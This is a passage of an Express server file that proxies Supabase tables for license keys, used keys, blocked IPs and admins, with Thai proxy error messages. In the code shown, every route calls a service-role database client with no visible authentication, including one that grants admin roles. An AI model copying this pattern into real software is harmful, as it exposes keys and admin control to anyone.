        errorMsg = 'ไม่สามารถสร้างการเชื่อมต่อที่ปลอดภัย (TLS Error). Proxy นี้อาจไม่รองรับ HTTPS หรือถูกบล็อก';
      } else if (err?.code === 'ECONNREFUSED' || errMsg.includes('ECONNREFUSED')) {
        errorMsg = 'เชื่อมต่อล้มเหลว (ECONNREFUSED). เซิร์ฟเวอร์ Proxy ออฟไลน์หรือไม่สามารถติดต่อได้';
      } else if (errMsg.includes('CONNECT response')) {
        errorMsg = 'การเชื่อมต่อถูกตัดตอนเชื่อมต่อกับ Proxy (Proxy connection ended). กรุณาลองทดสอบอีกครั้ง หรือเปลี่ยน Proxy';
      }
      
      return res.json({ success: false, error: errorMsg, isProxyError: true });
    }
  });

  // --- Supabase Proxy Routes ---
  app.get('/api/license_keys', async (req, res) => {
    try {
      const { data, error } = await supabaseAdmin.from('license_keys').select('*').order('created_at', { ascending: false });
      if (error) {
        console.error('Supabase error fetching license_keys:', JSON.stringify(error));
        return res.status(500).json({ error: error.message, detail: error.details, hint: error.hint });
      }
      res.json(data || []);
    } catch (err) {
      console.error('Internal server error fetching license_keys:', err);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  app.post('/api/license_keys', async (req, res) => {
    try {
      const { key, plan, status } = req.body;
      const { data, error } = await supabaseAdmin.from('license_keys').insert([{ key, plan, status, created_at: new Date().toISOString() }]).select();
      if (error) {
        console.error('Supabase error inserting license_key:', error);
        return res.status(500).json({ error: error.message });
      }
      res.json(data[0]);
    } catch (err) {
      console.error('Internal server error inserting license_key:', err);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  app.delete('/api/license_keys/:id', async (req, res) => {
    try {
      const { error } = await supabaseAdmin.from('license_keys').delete().eq('id', req.params.id);
      if (error) {
        console.error('Supabase error deleting license_key:', error);
        return res.status(500).json({ error: error.message });
      }
      res.json({ success: true });
    } catch (err) {
      console.error('Internal server error deleting license_key:', err);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  app.patch('/api/license_keys/:id', async (req, res) => {
    try {
      const { status } = req.body;
      const { data, error } = await supabaseAdmin.from('license_keys').update({ status }).eq('id', req.params.id).select();
      if (error) {
        console.error('Supabase error updating license_key:', error);
        return res.status(500).json({ error: error.message });
      }
      res.json(data[0]);
    } catch (err) {
      console.error('Internal server error updating license_key:', err);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  app.post('/api/license_keys/bulk', async (req, res) => {
    try {
      const { keys } = req.body; // Array of { key, type, status, created_at }
      const { data, error } = await supabaseAdmin.from('license_keys').insert(keys).select();
      if (error) {
        console.error('Supabase error bulk inserting license_keys:', error);
        return res.status(500).json({ error: error.message });
      }
      res.json(data);
    } catch (err) {
      console.error('Internal server error bulk inserting license_keys:', err);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  app.get('/api/validate_key/:key', async (req, res) => {
    try {
      const { data, error } = await supabaseAdmin
        .from('license_keys')
        .select('*')
        .eq('key', req.params.key)
        .single();
      
      if (error) {
        if (error.code === 'PGRST116') { // Not found
          return res.status(404).json({ error: 'Key not found' });
        }
        console.error('Supabase error validating key:', error);
        return res.status(500).json({ error: error.message });
      }
      res.json(data);
    } catch (err) {
      console.error('Internal server error validating key:', err);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  app.get('/api/used_keys', async (req, res) => {
    try {
      const { data, error } = await supabaseAdmin.from('used_keys').select('*').order('used_at', { ascending: false }).limit(100);
      if (error) {
        console.error('Supabase error fetching used_keys:', JSON.stringify(error));
        return res.status(500).json({ error: error.message, detail: error.details, hint: error.hint });
      }
      res.json(data || []);
    } catch (err) {
      console.error('Internal server error fetching used_keys:', err);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  app.post('/api/used_keys', async (req, res) => {
    try {
      const { key, ip, details } = req.body;
      const { data, error } = await supabaseAdmin.from('used_keys').insert([{ 
        key, 
        ip, 
        details, 
        used_at: new Date().toISOString() 
      }]).select();
      if (error) {
        console.error('Supabase error inserting used_key:', error);
        return res.status(500).json({ error: error.message });
      }
      res.json(data[0]);
    } catch (err) {
      console.error('Internal server error inserting used_key:', err);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  app.get('/api/blocked_ips', async (req, res) => {
    try {
      const { data, error } = await supabaseAdmin.from('blocked_ips').select('*').order('blocked_at', { ascending: false });
      if (error) {
        console.error('Supabase error fetching blocked_ips:', JSON.stringify(error));
        return res.status(500).json({ error: error.message, detail: error.details, hint: error.hint });
      }
      res.json(data || []);
    } catch (err) {
      console.error('Internal server error fetching blocked_ips:', err);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  app.post('/api/blocked_ips', async (req, res) => {
    try {
      const { ip, reason } = req.body;
      const { data, error } = await supabaseAdmin.from('blocked_ips').upsert([{ ip, reason, blocked_at: new Date().toISOString() }]).select();
      if (error) {
        console.error('Supabase error upserting blocked_ip:', error);
        return res.status(500).json({ error: error.message });
      }
      res.json(data[0]);
    } catch (err) {
      console.error('Internal server error upserting blocked_ip:', err);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  app.delete('/api/blocked_ips/:ip', async (req, res) => {
    try {
      const { error } = await supabaseAdmin.from('blocked_ips').delete().eq('ip', req.params.ip);
      if (error) {
        console.error('Supabase error deleting blocked_ip:', error);
        return res.status(500).json({ error: error.message });
      }
      res.json({ success: true });
    } catch (err) {
      console.error('Internal server error deleting blocked_ip:', err);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  app.get('/api/check_ip/:ip', async (req, res) => {
    try {
      const { data, error } = await supabaseAdmin.from('blocked_ips').select('*').eq('ip', req.params.ip).single();
      res.json({ blocked: !!data });
    } catch (err) {
      console.error('Internal server error checking IP:', err);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  app.post('/api/admins', async (req, res) => {
    try {
      const { username, role } = req.body;
      const { data, error } = await supabaseAdmin.from('admins').upsert([{ 
        username, 
        role, 
        granted_at: new Date().toISOString() 
      }]).select();
      if (error) {
        console.error('Supabase error upserting admin:', error);
        return res.status(500).json({ error: error.message });
      }
      res.json(data[0]);
    } catch (err) {
      console.error('Internal server error upserting admin:', err);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  app.post('/api/log_error', (req, res) => {
    console.error('CLIENT ERROR:', req.body);
    import('fs').then(fs => {
      try {
        const safeBody = typeof req.body === 'object' ? JSON.stringify(req.body) : String(req.body);
        fs.appendFileSync('client_errors.log', safeBody + '\n');
      } catch (err) {
        console.error('Failed to log client error:', err);
      }
    }).catch(console.error);
    res.json({ received: true });
  });

  if (process.env.NODE_ENV !== "production" && !process.env.VERCEL) {
    console.log("Initializing Vite middleware...");
    const vite = await createViteServer({
      server: { 
        middlewareMode: true,
        hmr: false // Explicitly disable HMR to avoid port conflicts
      },
      appType: "spa",
    });
    app.use(vite.middlewares);
    console.log("Vite middleware initialized.");
  } else if (!process.env.VERCEL) {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  if (!process.env.VERCEL) {
    app.listen(PORT, "0.0.0.0", () => {
      console.log(`Server running on http://localhost:${PORT}`);
    });
  }
  
  return app;
}

process.on('unhandledRejection', (reason: any, promise) => {
  if (reason && (reason.name === 'CanceledError' || reason.code === 'ERR_CANCELED' || reason.message === 'canceled')) {
    return; // Ignore axios aborts
  }
  if (!reason || (typeof reason === 'object' && Object.keys(reason).length === 0)) {
    return; // Ignore empty reasons
  }
  console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});

process.on('uncaughtException', (err) => {
  console.error('Uncaught Exception:', err);
});

// For Vercel Serverless Functions
let appPromise = startServer().catch(err => {
  console.error('Failed to start server:', err);
});

export default async (req: any, res: any) => {
  const app = await appPromise;
  if (app) {
    app(req, res);
  } else {
    res.status(500).send('Server failed to start');
  }
};
